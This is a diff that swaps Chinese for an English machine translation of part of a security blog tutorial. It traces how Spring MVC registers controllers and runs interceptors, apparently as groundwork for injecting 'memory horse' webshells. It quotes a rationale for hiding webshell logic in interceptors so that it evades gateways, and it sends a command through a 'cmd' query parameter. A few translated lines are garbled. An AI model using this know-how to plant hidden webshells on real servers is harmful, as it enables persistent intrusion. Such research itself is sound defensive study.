-这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在`defaultStrategies`中；接下来从`strategyInterface`获取一个名称，然后用这个名称在`defaultStrategies`中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过`ClassUtils.forName`方法加载该类 ②使用`createDefaultStrategy`方法创建该类的实例；最后将创建的策略对象添加到列表`strategies`中并返回。
+This code is quite interesting. First, it loads the resource file and stores its contents in `defaultStrategies` in the form of attribute key-value pairs; then gets a name from `strategyInterface`, and then uses this name to find the corresponding value in `defaultStrategies`. If it is found, it separates the value into a class name array by comma, then iterates over the class name array, and performs the following two operations for each class name: ① Try to load the class through the `ClassUtils.forName` method ② Create an instance of the class using the `createDefaultStrategy` method; finally add the created policy object to the list `strategies` and return.
 
-那就很好奇了，这段代码中的`DEFAULT_STRATEGIES_PATH`里面有啥？`Ctrl+左键`追踪：
+Then I'm very curious, what's in `DEFAULT_STRATEGIES_PATH` in this code? `Ctrl+left key` tracking:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174426118.png)
 
-原来是一个名叫`DispatcherServlet.properties`的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和`DispatcherServlet.java`在一块儿的：
+It turned out to be a file named `DispatcherServlet.properties`. We can quickly flip it into the dependency list on the left, because it should be with `DispatcherServlet.java`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174523396.png)
 
-从文件内容中，我们可以很快地锁定关键信息：
+From the file content, we can quickly lock in key information:
 
 ```properties
 org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\
-	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\
-	org.springframework.web.servlet.function.support.RouterFunctionMapping
+    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\
+    org.springframework.web.servlet.function.support.RouterFunctionMapping
 ```
 
-也就是说，会有三个值，分别是`BeanNameUrlHandlerMapping`、`RequestMappingHandlerMapping`和`RouterFunctionMapping`，我们一般用的是第二个，我们点进`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`看一下：
+In other words, there will be three values, namely `BeanNameUrlHandlerMapping`, `RequestMappingHandlerMapping` and `RouterFunctionMapping`. We usually use the second one. Let's click on `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping` to take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174955839.png)
 
-它的父类`RequestMappingInfoHandlerMapping`的父类`AbstractHandlerMethodMapping`实现了`InitializingBean`这个接口，这个接口用于在`bean`初始化完成后执行一些特定的自定义初始化逻辑。
+Its parent class `RequestMappingInfoHandlerMapping`'s parent class `AbstractHandlerMethodMapping` implements the `InitializingBean` interface, which is used to execute some specific custom initialization logic after the `bean` initialization is completed.
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175247104.png)
 
-点进该接口，只有一个`afterPropertiesSet`方法，关于该方法的用途可以参考`https://www.python100.com/html/U711CO7MV79C.html`：
+Clicking into this interface, there is only one `afterPropertiesSet` method. For the purpose of this method, please refer to `https://www.python100.com/html/U711CO7MV79C.html`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175806150.png)
 
-那我们就看看`AbstractHandlerMethodMapping`它是具体咋实现`InitializingBean`的`afterPropertiesSet`的吧：
+Then let's take a look at the `AbstractHandlerMethodMapping` which implements the `afterPropertiesSet` of `InitializingBean`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180208640.png)
 
-重写的也很简单，调用`initHandlerMethods`这个方法，继续跟踪该方法：
+The rewritten is also very simple. Call the `initHandlerMethods` method and continue to track the method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180258066.png)
 
-注释里面写的很清楚：扫描`ApplicationContext`中的`bean`，然后检测并注册`handler methods`。
+The comments are very clear: scan the bean in the ApplicationContext, and then detect and register the handler methods.
 
-我们在`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods`这里打下断点进行调试，到图中这一步之后`step into`：
+We set a breakpoint here in `org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods` for debugging. After this step in the figure, `step into`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191019570.png)
 
-我们来看`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean`这个方法的具体逻辑：
+Let's look at the specific logic of the method `org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191122592.png)
 
-这里我们自然很好奇，这个`isHandler`是判断啥的，我们点进去看看：
+We are naturally very curious here. This `isHandler` is a judgment. Let's click in and take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191924946.png)
 
-可以看到，这里并没有给出实现，说明子类中应该会给出`override`，于是直接找到了`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler`：
+As you can see, no implementation is given here, indicating that `override` should be given in the subclass, so you directly find `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192146352.png)
 
-很明显，`isHandler`是用来检测给定的`beanType`类是否带有`Controller`注解或者`RequestMapping`注解。
+Obviously, the `isHandler` is used to detect whether the given `beanType` class has a `Controller` annotation or a `RequestMapping` annotation.
 
-解决了这个，继续往后看，后面是调用了`detectHandlerMethods`这个方法，我们点进去看看：
+After solving this, continue to look back. The method `detectHandlerMethods` is called. Let's click in and take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192734772.png)
 
-我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断`handler`是否是字符串类型，如果是，则通过`ApplicationContext`获取它的类型；否则，直接获取`handler`的类型。：
+Let's look at it separately. First, this line of code is written in a comprehensive way, which means that you first determine whether the `handler` is a string type. If so, you can get its type through `ApplicationContext`; otherwise, you can directly get the type of `handler`. :
 
 ```java
 Class<?> handlerType = (handler instanceof String ?
             obtainApplicationContext().getType((String) handler) : handler.getClass());
 ```
 
-然后是这部分：
+Then here is this part:
 
 ```java
 Class<?> userType = ClassUtils.getUserClass(handlerType);
@@ -1141,376 +1143,376 @@ Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
         });
 ```
 
-先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个`selectMethods`方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用`getMappingForMethod`来获取方法的映射信息。
+First, we get the user class of the processor. The user class is a class that is not wrapped by a proxy, so that we can ensure that the class that is actually processing the request is obtained; then there is the `selectMethods` method. This method has two parameters. The first parameter is the user class and the second parameter is a callback function. The key is to understand the role of this callback function. For each method, it tries to call `getMappingForMethod` to get the mapping information of the method.
 
-我们点进这个方法，发现它是一个抽象方法：
+We clicked on this method and found that it is an abstract method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118193938936.png)
 
-那就去看看他的子类中有没有对应的实现，直接定位到`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod`：
+Then let’s see if there is a corresponding implementation in its subclass, and directly locate it at `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118194251185.png)
 
-我们在下图所示位置打断点调试：
+We debug the breakpoint at the location shown in the figure below:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195411713.png)
 
-分开来看，首先是第一行：
+Let's look at it separately, first line:
 
 ```java
 RequestMappingInfo info = createRequestMappingInfo(method);
 ```
 
-解析`Controller`类的方法中的注解，生成一个对应的`RequestMappingInfo`对象。我们可以`step into`进入`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)`方法：
+Analyze the annotations in the method of the `Controller` class to generate a corresponding `RequestMappingInfo` object. We can `step into``org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195804561.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195850878.png)
 
-可以看到这个`info`里面保存了访问该方法的`url pattern`是`"/"`，也就是我们在`TestController.java`所想要看到的当`@RequestMapping("/")`时，调用`test`方法。
+You can see that the url pattern in this `info` saves the url pattern` of accessing the method is `"/"`, which is what we want to see in `TestController.java` when `@RequestMapping("/")`, call the `test` method.
 
-继续一步步往下走，可以看到走到了`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods`的最后：
+Continue to go down step by step and you can see that you have reached the end of `org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118200254342.png)
 
-直接看`lambda`表达式里面的内容：
+Look directly at the contents of the `lambda` expression:
 
 ```java
 Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
 registerHandlerMethod(handler, invocableMethod, mapping);
 ```
 
-意思是，先用`selectInvocableMethod`方法根据`method`和`userType`选择出一个可调用的方法，这样是为了处理可能存在的代理和`AOP`的情况，确保获取到的是可直接调用的原始方法；然后把`bean`、`Method`和`RequestMappingInfo`注册进`MappingRegistry`。
+It means that first selectInvocableMethod method to select a callable method based on the method and `userType`, in order to deal with possible proxy and `AOP` situations, ensure that the original method that can be called directly is obtained; then register the `bean`, `Method` and `RequestMappingInfo` into the `MappingRegistry`.
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118201648822.png)
 
-到这里，`url`和`Controller`之间的关系是如何建立的问题就解决了。
+At this point, the problem of how the relationship between `url` and `Controller` is established is solved.
 
-#### 2.11.2.3 Spring Interceptor引入与执行流程分析
+#### 2.11.2.3 Spring Interceptor introduction and execution process analysis
 
-我们回顾之前聊到的`Controller`的思路和下面的`4.1`节中所展示的`Controller`内存马，可以考虑到这样一个问题：
+We can consider this issue when we review the idea of ​​`Controller` that we talked about before and the `Controller` memory horse shown in Section 4.1 below:
 
-> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`
+> With the iterative evolution of microservice deployment technology, large business systems will pass through some series of gateways, complex balances, and firewalls when they arrive at real application servers. So if your new `shell` route is not on the whitelist of these gateways, it is very likely that it will not be accessible and will be discarded before reaching the application server.The purpose we want to achieve is to be able to execute our code before accessing a normal business address. Therefore, when injecting `java` memory horse, try not to use new routes to specifically process the `webshell` logic we injected. It is best to process our `webshell` logic in advance before every request reaches the real business logic. Under the `tomcat` container, there are `filter`, `listener` and other technologies that can meet the above requirements. So at the `spring` framework level, is there a way to achieve the effect mentioned above?      ——Excerpt from`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/andndex.md`and`https://landgrey.me/blog/19/`
 
-答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。
+The answer is of course there is, and this is what we are going to talk about, an interceptor mechanism in the `Spring` framework.
 
-那就不禁要问了：这个`Spring Interceptor`和我们之前所说的`Filter`的区别是啥？
+Then I can’t help but ask: What is the difference between this `Spring Interceptor` and the `Filter` we mentioned before?
 
-> 参考：https://developer.aliyun.com/article/925400
+> reference:https://developer.aliyun.com/article/925400
 
-主要有以下六个方面：
+There are mainly six aspects:
 
-| 主要区别                 | 拦截器                                                   | 过滤器                      |
+| Key differences                | Interceptor                                                   | Filter                      |
 | ------------------------ | -------------------------------------------------------- | --------------------------- |
-| 机制                     | `Java`反射机制                                           | 函数回调                    |
-| 是否依赖`Servlet`容器    | 不依赖                                                   | 依赖                        |
-| 作用范围                 | 对`action`请求起作用                                     | 对几乎所有请求起作用        |
-| 是否可以访问上下文和值栈 | 可以访问                                                 | 不能访问                    |
-| 调用次数                 | 可以多次被调用                                           | 在容器初始化时只被调用一次  |
-| `IOC`容器中的访问        | 可以获取`IOC`容器中的各个`bean`（基于`FactoryBean`接口） | 不能在`IOC`容器中获取`bean` |
+| mechanism                     | `Java` reflection mechanism                                           | Function callback                    |
+| Whether to rely on `Servlet` container    | Not dependent                                                   | rely                        |
+| Range of action                 | Works on `action` request                                     | Works on almost all requests        |
+| Is the context and value stack accessible?xt and value stack accessible? | Available to access                                                 | Not accessible                    |
+| Number of calls                 | Can be called multiple times                                           | It is called only once when the container is initialized  |
+| Access in the `IOC` container        | You can get the individual beans in the `IOC` container (based on the `FactoryBean` interface) | Cannot get `bean` in `IOC` container |
 
-我们在`2.10.2`节中给出的`TestInterceptor.java`的`preHandle`函数这里下断点，然后访问`http://127.0.0.1:8080/?cmd=whoami`进入调试：
+We give a breakpoint in the `TestInterceptor.java` function of `2.10.2` section, and then visit `http://127.0.0.1:8080/?cmd=whoami` to enter debugging:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119210645412.png)
 
-一步步步入调试之后，发现进入`org.springframework.web.servlet.DispatcherServlet#doDispatch`方法：
+After stepping into debugging step by step, I found that the method to enter `org.springframework.web.servlet.DispatcherServlet#doDispatch`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211041073.png)
 
-我们在`doDispatch`方法的第一行下断点，重新访问页面调试：
+We breakpoint at the first line of the `doDispatch` method and revisit the page debugging:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211454480.png)
 
-看到了调用了`getHandler`这个函数，它的注释写的简单易懂：确定处理当前请求的`handler`，我们`step into`看看：
+I saw that the function `getHandler` was called, and its comments were written in a simple and easy-to-understand way: determine the `handler` that handles the current request, let's take a look at it `step into`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213144754.png)
 
-通过遍历当前`handlerMapping`数组中的`handler`对象，来判断哪个`handler`来处理当前的`request`对象：
+By traversing the `handler` object in the current `handlerMapping` array, we can determine which `handler` handles the current `request` object:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213521627.png)
 
-继续步入这个函数里面所用到的`mapping.getHandler`方法，也就是`org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`：
+Continue to enter the `mapping.getHandler` method used in this function, that is, `org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119214714153.png)
 
-代码简单易懂，先是通过`getHandlerInternal`来获取，如果获取不到，那就调用`getDefaultHandler`来获取默认的，如果还是获取不到，就直接返回`null`；然后检查`handler`是不是一个字符串，如果是，说明可能是一个`Bean`的名字，这样的话就通过`ApplicationContext`来获取对应名字的`Bean`对象，这样就确保 `handler` 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 `initLookupPath(request)` 方法来初始化请求路径的查找；最后通过 `getHandlerExecutionChain` 方法创建一个处理器执行链。
+The code is simple and easy to understand. First, it is obtained through `getHandlerInternal`. If it cannot be obtained, then call `getDefaultHandler` to get the default. If it still cannot be obtained, it will directly return `null`; then check whether the `handler` is a string. If it is, it means that it may be a `Bean` name. In this way, the `ApplicationContext` object of the corresponding name is obtained, so that the `handler` object will eventually be a legal processor object; then check whether there is a cached request path, and if there is no cache, call the `initLookupPath(request)` method to initialize the search for the request path; finally create a processor execution chain through the `getHandlerExecutionChain` method.
 
-这么看下来，这个`getHandlerExecutionChain`方法很重要，我们步入看看：
+From this point of view, this `getHandlerExecutionChain` method is very important. Let's take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119220340092.png)
 
-遍历`adaptedInterceptors`，判断拦截器是否是`MappedInterceptor`类型，如果是那就看`MappedInterceptor`是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。
+Traversing the `adaptedInterceptors` to determine whether the interceptor is of the `MappedInterceptor` type. If so, it depends on whether the `MappedInterceptor` matches the current request. If so, add its actual interceptor to the execution chain. If it is not of this type, add the interceptor to the execution chain directly.
 
-再回到之前的`getHandler`方法中来，看看它的后半段：
+Let's go back to the previous `getHandler` method and take a look at its second half:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223022260.png)
 
-主要都是处理跨域资源共享（`CORS`）的逻辑，只需要知道在涉及`CORS`的时候把`request`、`executionChain`和`CORS`配置通过`getCorsHandlerExecutionChain`调用封装后返回就行了。
+It mainly deals with cross-domain resource sharing (`CORS`). You only need to know that when `CORS` is involved, `executionChain`, and `CORS` configurations are encapsulated and returned through `getCorsHandlerExecutionChain`.
 
-一步步执行回到一开始的`getHandler`中，这里就是调用`org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle`方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：
+Step by step, go back to the `getHandler` at the beginning. Here we call the `org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle` method to traverse all interceptors for preprocessing. There is basically no need to understand the following code:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223829102.png)
 
-## 2.12 Spring WebFlux介绍与代码调试分析
+## 2.12 Introduction to Spring WebFlux and code debugging analysis
 
-`SpringWebFlux`是`Spring Framework 5.0`中引入的新的响应式`web`框架。传统的`Spring MVC`在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，`WebFlux`引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和`WebSocket`，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，`WebFlux`可以更好地适应这种异步通信的需求。
+`SpringWebFlux` is a new responsive `web` framework introduced in `Spring Framework 5.0`. The traditional Spring MVC is blocking when processing requests, that is, each request will occupy a thread. If a large number of requests arrive at the same time, a large number of threads are required to process, which may lead to resource exhaustion. To solve this problem, WebFlux introduces a non-blocking responsive programming model. By using asynchronous non-blocking methods to handle requests, it can more efficiently support a large number of concurrent requests and improve the system's throughput; and it can easily handle long connections and WebSockets, which is suitable for application scenarios that need to keep connections, such as real-time communication and push services; in the microservice architecture, communication between services often requires efficient processing, and WebFlux can better adapt to the needs of such asynchronous communication.
 
-关于`Reactive`和`Spring WebFlux`的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：
+For related knowledge about `Reactive` and `Spring WebFlux`, you can refer to this article on Zhihu. It is easy to understand and thorough:
 
 > https://zhuanlan.zhihu.com/p/559158740
 
-`WebFlux`框架开发的接口返回类型必须是`Mono<T>`或者是`Flux<T>`。因此我们第一个需要了解的就是什么是`Mono`以及什么是`Flux`。
+The interface return type developed by the `WebFlux` framework must be `Mono<T>` or `Flux<T>`. So the first thing we need to know is what is `Mono` and what is `Flux`.
 
-### 2.12.1 什么是Mono？
+### 2.12.1 What is Mono?
 
-`Mono`用来表示包含`0`或`1`个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在`Mono`中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在`2.10.3`节中的那张`gif`图中所看到的那样。
+`Mono` is used to represent an asynchronous sequence containing `0` or `1` elements. It is an asynchronous, composable, and capable of handling asynchronous data streams. For example, when we initiate an asynchronous database query, network call, or other asynchronous operation, the results of the operation can be wrapped in `Mono`, which allows us to process the asynchronous results responsively, rather than blocking the thread and waiting for the result to return, as we saw in the `gif` diagram in `2.10.3`.
 
-下面我们来看看`Mono`常用的`api`：
+Let's take a look at the commonly used `Mono`api`:
 
-|                             API                              |                             说明                             |                           代码示例                           |
+|                             API                              |                             illustrate                             |                           Code description例                           |
 | :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
-|                     `Mono.just(T data)`                      |               创建一个包含指定数据的 `Mono`。                |       `Mono<String> mono = Mono.just("Hello, Mono!");`       |
-|                        `Mono.empty()`                        |                    创建一个空的 `Mono`。                     |           `Mono<Object> emptyMono = Mono.empty();`           |
-|                `Mono.error(Throwable error)`                 |                 创建一个包含错误的 `Mono`。                  | `Mono<Object> errorMono = Mono.error(new RuntimeException("Something went wrong"));` |
-|          `Mono.fromCallable(Callable<T> supplier)`           |    从 Callable 创建 `Mono`，表示可能抛出异常的异步操作。     | `Mono<String> resultMono = Mono.fromCallable(() -> expensiveOperation());` |
-|            `Mono.fromRunnable(Runnable runnable)`            |     从 Runnable 创建 `Mono`，表示没有返回值的异步操作。      | `Mono<Void> runnableMono = Mono.fromRunnable(() -> performAsyncTask());` |
-|                 `Mono.delay(Duration delay)`                 |             在指定的延迟后创建一个空的 `Mono`。              | `Mono<Object> delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));` |
-| `Mono.defer(Supplier<? extends Mono<? extends T>> supplier)` |        延迟创建 `Mono`，直到订阅时才调用供应商方法。         | `Mono<String> deferredMono = Mono.defer(() -> Mono.just("Deferred Result"));` |
-| `Mono.whenDelayError(Iterable<? extends Mono<? extends T>> monos)` | 将一组 `Mono` 合并为一个 `Mono`，当其中一个出错时，继续等待其他的完成。 | `Mono<String> resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));` |
-|   `Mono.map(Function<? super T, ? extends V> transformer)`   |                 对 `Mono` 中的元素进行映射。                 |   `Mono<Integer> resultMono = mono.map(s -> s.length());`    |
-| `Mono.flatMap(Function<? super T, ? extends Mono<? extends V>> transformer)` |               对 `Mono` 中的元素进行异步映射。               | `Mono<Integer> resultMono = mono.flatMap(s -> Mono.just(s.length()));` |
-|          `Mono.filter(Predicate<? super T> tester)`          |                    过滤 `Mono` 中的元素。                    | `Mono<String> filteredMono = mono.filter(s -> s.length() > 5);` |
-|             `Mono.defaultIfEmpty(T defaultVal)`              |               如果 `Mono` 为空，则使用默认值。               | `Mono<String> resultMono = mono.defaultIfEmpty("Default Value");` |
-| `Mono.onErrorResume(Function<? super Throwable, ? extends Mono<? extends T>> fallback)` |             在发生错误时提供一个备用的 `Mono`。              | `Mono<String> resultMono = mono.onErrorResume(e -> Mono.just("Fallback Value"));` |
-|        `Mono.doOnNext(Consumer<? super T> consumer)`         |               在成功时执行操作，但不更改元素。               | `Mono<String> resultMono = mono.doOnNext(s -> System.out.println("Received: " + s));` |
-|    `Mono.doOnError(Consumer<? super Throwable> onError)`     |                    在发生错误时执行操作。                    | `Mono<String> resultMono = mono.doOnError(e -> System.err.println("Error: " + e.getMessage()));` |
-|        `Mono.doFinally(Consumer<SignalType> action)`         |                 无论成功还是出错都执行操作。                 | `Mono<String> resultMono = mono.doFinally(signal -> System.out.println("Processing finished: " + signal));` |
+|                     `Mono.just(T data)`                      |               Creates a `Mono` containing the specified data.                |       `Mono<String> mono = Mono.just("Hello, Mono!");`       |
+|                        `Mono.empty()`                        |                    Create an empty `Mono`.                     |           `Mono<Object> emptyMono = Mono.empty();`           |
+|                `Mono.error(Throwable error)`                 |                 Create a `Mono` containing the error.                  | `Mono<Object> errorMono = Mono.error(new RuntimeException("Something went wrong"));` |
+|          `Mono.fromCallable(Callable<T> supplier)`           |    Create `Mono` from Callable, indicating an asynchronous operation that may throw an exception.     | `Mono<String> resultMono = Mono.fromCallable(() -> expensiveOperation());` |
+|            `Mono.fromRunnable(Runnable runnable)`            |     Create `Mono` from Runnable, indicating an asynchronous operation without a return value.      | `Mono<Void> runnableMono = Mono.fromRunnable(() -> performAsyncTask());` |
+|                 `Mono.delay(Duration delay)`                 |             Create an empty `Mono` after the specified delay.              | `Mono<Object> delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));` |
+| `Mono.defer(Supplier<? extends Mono<? extends T>> supplier)` |        Delay creation of `Mono` and the vendor method is not called until the subscription is subscribed.         | `Mono<String> deferredMono = Mono.defer(() -> Mono.just("Deferred Result"));` |
+| `Mono.whenDelayError(Iterable<? extends Mono<? extends T>> monos)` | Merge a group of `Mono` into a `Mono`, and when one of them goes wrong, continue to wait for the others to complete. | `Mono<String> resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));` |
+|   `Mono.map(Function<? super T, ? extends V> transformer)`   |                Map elements in `Mono`.                 |   `Mono<Integer> resultMono = mono.map(s -> s.length());`    |
+| `Mono.flatMap(Function<? super T, ? extends Mono<? extends V>> transformer)` |               Asynchronously map elements in `Mono`.               | `Mono<Integer> resultMono = mono.flatMap(s -> Mono.just(s.length()));` |
+|          `Mono.filter(Predicate<? super T> tester)`          |                   Filter elements in `Mono`.                    | `Mono<String> filteredMono = mono.filter(s -> s.length() > 5);` |
+|             `Mono.defaultIfEmpty(T defaultVal)`              |               If `Mono` is empty, the default value is used.               | `Mono<String> resultMono = mono.defaultIfEmpty("Default Value");` |
+| `Mono.onErrorResume(Function<? super Throwable, ? extends Mono<? extends T>> fallback)` |             Provides an alternate `Mono` when an error occurs.              | `Mono<String> resultMono = mono.onErrorResume(e -> Mono.just("Fallback Value"));` |
+|        `Mono.doOnNext(Consumer<? super T> consumer)`         |               Perform an action on success, but do not change the element.               | `Mono<String> resultMono = mono.doOnNext(s -> System.out.println("Received: " + s));` |
+|    `Mono.doOnError(Consumer<? super Throwable> onError)`     |                    Perform an action when an error occurs.                    | `Mono<String> resultMono = mono.doOnError(e -> System.err.println("Error: " + e.getMessage()));` |
+|        `Mono.doFinally(Consumer<SignalType> action)`         |                 Perform actions regardless of success or error.                 | `Mono<String> resultMono = mono.doFinally(signal -> System.out.println("Processing finished: " + signal));` |
 
-### 2.12.2 什么是Flux？
+### 2.12.2 What is Flux?
 
-`Flux`表示的是`0`到`N`个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地`publish`元素。也就是说，`Flux`允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。
+`Flux` represents an asynchronous sequence of `0` to `N` elements, which can be published one by one or batch by batch in an asynchronous manner according to time. That is, `Flux` allows the process of processing elements without having to wait for all elements to be ready, but can be pushed to subscribers immediately when they are ready. This asynchronous push method allows programs to handle the generation and consumption of elements more flexibly without blocking the execution thread.
 
-下面是`Flux`常用的`api`：
+Here are the commonly used `Flux`api`:
 
-|           API           |                   说明                   |                           代码示例                           |
+|           API           |                   illustrate                   |                           Code Example                           |
 | :---------------------: | :--------------------------------------: | :----------------------------------------------------------: |
-|     **`Flux.just`**     |         创建包含指定元素的`Flux`         |       `Flux<String> flux = Flux.just("A", "B", "C");`        |
-| **`Flux.fromIterable`** |          从`Iterable`创建`Flux`          | `List<String> list = Arrays.asList("A", "B", "C");`<br>`Flux<String> flux = Flux.fromIterable(list);` |
-|  **`Flux.fromArray`**   |             从数组创建`Flux`             | `String[] array = {"A", "B", "C"};`<br>`Flux<String> flux = Flux.fromArray(array);` |
-|    **`Flux.empty`**     |            创建一个空的`Flux`            |           `Flux<Object> emptyFlux = Flux.empty();`           |
-|    **`Flux.error`**     |         创建一个包含错误的`Flux`         | `Flux<Object> errorFlux = Flux.error(new RuntimeException("Something went wrong"));` |
-|    **`Flux.range`**     |    创建包含指定范围的整数序列的`Flux`    |        `Flux<Integer> rangeFlux = Flux.range(1, 5);`         |
-|   **`Flux.interval`**   |      创建包含定期间隔的元素的`Flux`      | `Flux<Long> intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);` |
-|    **`Flux.merge`**     |    合并多个Flux，按照时间顺序交织元素    | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> mergedFlux = Flux.merge(flux1, flux2);` |
-|    **`Flux.concat`**    |     连接多个`Flux`，按照顺序发布元素     | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> concatenatedFlux = Flux.concat(flux1, flux2);` |
-|     **`Flux.zip`**      | 将多个`Flux`的元素进行配对，生成`Tuple`  | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("1", "2");`<br>`Flux<Tuple2<String, String>> zippedFlux = Flux.zip(flux1, flux2);` |
